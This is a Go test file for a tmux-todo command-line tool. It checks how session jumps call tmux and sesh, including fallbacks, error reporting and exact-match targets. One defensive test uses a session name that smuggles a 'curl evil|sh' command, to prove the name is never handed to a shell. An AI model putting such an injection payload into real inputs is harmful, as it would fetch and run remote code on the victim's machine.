package cli

import (
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/agusarias/tmux-todo/internal/tui"
)

// call is one invocation the jump made, argv and all.
type call struct {
	name string
	args []string
}

func (c call) String() string { return c.name + " " + strings.Join(c.args, " ") }

// recorder is a runner that records every call and answers from a script.
//
// fail matches on the command *name* rather than the whole argv, because that is
// how the real failures arrive: `sesh` is either installed or it is not.
type recorder struct {
	calls []call
	fail  map[string]error
}

func (r *recorder) run(name string, args ...string) error {
	r.calls = append(r.calls, call{name: name, args: args})
	return r.fail[name]
}

func (r *recorder) argv() []string {
	out := make([]string, 0, len(r.calls))
	for _, c := range r.calls {
		out = append(out, c.String())
	}
	return out
}

// TestJumpInvocationTable covers DoD 8, 9 and the outside-tmux row of the plan's
// table in one place, because the point of the table is that the four contexts
// are different and easy to conflate.
func TestJumpInvocationTable(t *testing.T) {
	for _, tc := range []struct {
		name        string
		jump        tui.Jump
		insideTmux  bool
		fail        map[string]error
		wantCalls   []string
		wantErr     bool
		wantNoSesh  bool
		description string
	}{
		{
			name:       "inside tmux, live: switch",
			jump:       tui.Jump{Session: "pulsar", Live: true},
			insideTmux: true,
			wantCalls:  []string{"tmux switch-client -t =pulsar"},
			wantNoSesh: true,
		},
		{
			name:       "inside tmux, not running: sesh switches",
			jump:       tui.Jump{Session: "api"},
			insideTmux: true,
			// -s, not bare connect: the client is already attached, always,
			// because we are running inside a popup.
			wantCalls: []string{"sesh connect -s api"},
		},
		{
			name:       "inside tmux, not running, sesh absent: tmux takes over",
			jump:       tui.Jump{Session: "api"},
			insideTmux: true,
			fail:       map[string]error{"sesh": errors.New(`exec: "sesh": executable file not found in $PATH`)},
			wantCalls: []string{
				"sesh connect -s api",
				"tmux new-session -d -s api",
				"tmux switch-client -t =api",
			},
		},
		{
			name:       "inside tmux, not running, sesh does not know the name",
			jump:       tui.Jump{Session: "api"},
			insideTmux: true,
			fail:       map[string]error{"sesh": errors.New("exit status 1")},
			wantCalls: []string{
				"sesh connect -s api",
				"tmux new-session -d -s api",
				"tmux switch-client -t =api",
			},
		},
		{
			name:       "outside tmux, live: attach",
			jump:       tui.Jump{Session: "pulsar", Live: true},
			wantCalls:  []string{"tmux attach -t =pulsar"},
			wantNoSesh: true,
		},
		{
			name:       "outside tmux, not running: create and attach in one",
			jump:       tui.Jump{Session: "api"},
			wantCalls:  []string{"tmux new-session -s api"},
			wantNoSesh: true,
		},
		{
			name:      "no jump at all is no subprocess",
			jump:      tui.Jump{},
			wantCalls: nil,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := &recorder{fail: tc.fail}
			err := performJump(tc.jump, tc.insideTmux, r.run)
			if (err != nil) != tc.wantErr {
				t.Fatalf("performJump error = %v, want error: %v", err, tc.wantErr)
			}
			got := r.argv()
			if strings.Join(got, " | ") != strings.Join(tc.wantCalls, " | ") {
				t.Errorf("calls =\n  %v\nwant\n  %v", got, tc.wantCalls)
			}
			if tc.wantNoSesh {
				for _, c := range r.calls {
					if c.name == "sesh" {
						t.Errorf("called sesh where it has no business: %v", got)
					}
				}
			}
		})
	}
}

// TestSwitchClientFailureIsReported — a jump that could not happen must not exit
// 0, or the popup closes and nothing moves and nothing says why.
func TestSwitchClientFailureIsReported(t *testing.T) {
	r := &recorder{fail: map[string]error{"tmux": errors.New("exit status 1")}}
	err := performJump(tui.Jump{Session: "pulsar", Live: true}, true, r.run)
	if err == nil {
		t.Fatal("a failed switch-client reported success")
	}
	if !strings.Contains(err.Error(), "pulsar") {
		t.Errorf("error %q does not name the session", err)
	}
}

// TestStaleLivenessStillEndsUpSwitching — the accepted cost of resolving
// liveness once: a session that started after the popup opened reads
// "not running", so sesh is tried, the tmux fallback's new-session fails with
// "duplicate session", and the switch must still happen anyway.
func TestStaleLivenessStillEndsUpSwitching(t *testing.T) {
	var switched bool
	run := func(name string, args ...string) error {
		switch {
		case name == "sesh":
			return errors.New("exit status 1")
		case name == "tmux" && args[0] == "new-session":
			return errors.New("duplicate session: api")
		case name == "tmux" && args[0] == "switch-client":
			switched = true
			return nil
		}
		return fmt.Errorf("unexpected call: %s %v", name, args)
	}
	if err := performJump(tui.Jump{Session: "api"}, true, run); err != nil {
		t.Fatalf("performJump: %v", err)
	}
	if !switched {
		t.Error("a duplicate-session error stopped the switch; a stale (not running) label must still land the user in the session")
	}
}

// TestSessionNamesAreNeverReparsedByAShell is DoD 13 and the task's critical
// surface. A session name is user data — it can hold spaces, quotes and `$` —
// and there is no tmux format that escapes for a shell. The assertion is on the
// argv: the name must arrive as exactly one element, byte for byte, in every
// command the table can issue.
func TestSessionNamesAreNeverReparsedByAShell(t *testing.T) {
	// A name that would execute if it were ever spliced into `sh -c`.
	const nasty = `x'; curl evil|sh; ' $HOME "and a space"`

	for _, tc := range []struct {
		name       string
		jump       tui.Jump
		insideTmux bool
		fail       map[string]error
		// wantArgs is the exact argv of each call, so a name that gained or lost
		// a byte, or got split, fails here rather than at a shell.
		wantArgs [][]string
	}{
		{
			name:       "switch-client",
			jump:       tui.Jump{Session: nasty, Live: true},
			insideTmux: true,
			wantArgs:   [][]string{{"switch-client", "-t", "=" + nasty}},
		},
		{
			name:       "sesh connect",
			jump:       tui.Jump{Session: nasty},
			insideTmux: true,
			wantArgs:   [][]string{{"connect", "-s", nasty}},
		},
		{
			name:       "the tmux fallback",
			jump:       tui.Jump{Session: nasty},
			insideTmux: true,
			fail:       map[string]error{"sesh": errors.New("no sesh")},
			wantArgs: [][]string{
				{"connect", "-s", nasty},
				{"new-session", "-d", "-s", nasty},
				{"switch-client", "-t", "=" + nasty},
			},
		},
		{
			name:     "attach from outside tmux",
			jump:     tui.Jump{Session: nasty, Live: true},
			wantArgs: [][]string{{"attach", "-t", "=" + nasty}},
		},
		{
			name:     "create from outside tmux",
			jump:     tui.Jump{Session: nasty},
			wantArgs: [][]string{{"new-session", "-s", nasty}},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := &recorder{fail: tc.fail}
			_ = performJump(tc.jump, tc.insideTmux, r.run)

			if len(r.calls) != len(tc.wantArgs) {
				t.Fatalf("calls = %v, want %d", r.argv(), len(tc.wantArgs))
			}
			for i, want := range tc.wantArgs {
				got := r.calls[i].args
				if len(got) != len(want) {
					t.Fatalf("call %d argv = %q, want %q", i, got, want)
				}
				for j := range want {
					if got[j] != want[j] {
						t.Errorf("call %d argv[%d] = %q, want %q", i, j, got[j], want[j])
					}
				}
				// The name is one element and nothing has been quoted into it.
				last := got[len(got)-1]
				if !strings.HasSuffix(last, nasty) {
					t.Errorf("call %d last argv element %q is not the raw session name", i, last)
				}
			}
			// And no shell anywhere: the whole class of bug is a shell being
			// handed a string built from a name.
			for _, c := range r.calls {
				if c.name == "sh" || c.name == "bash" || c.name == "zsh" {
					t.Errorf("the jump spawned a shell: %v", c)
				}
				for _, a := range c.args {
					if a == "-c" {
						t.Errorf("the jump used a -c string: %v", c)
					}
				}
			}
		})
	}
}

// TestExactTargetMatch — "=" in front of the name, so jumping to "dev" cannot
// land on "dev-2". tmux falls back to prefix and then fnmatch matching without
// it, which would silently switch to the wrong session.
func TestJumpTargetsAreExact(t *testing.T) {
	r := &recorder{}
	if err := performJump(tui.Jump{Session: "dev", Live: true}, true, r.run); err != nil {
		t.Fatalf("performJump: %v", err)
	}
	if got := r.calls[0].args[2]; got != "=dev" {
		t.Errorf("target = %q, want %q so a prefix match cannot win", got, "=dev")
	}
}
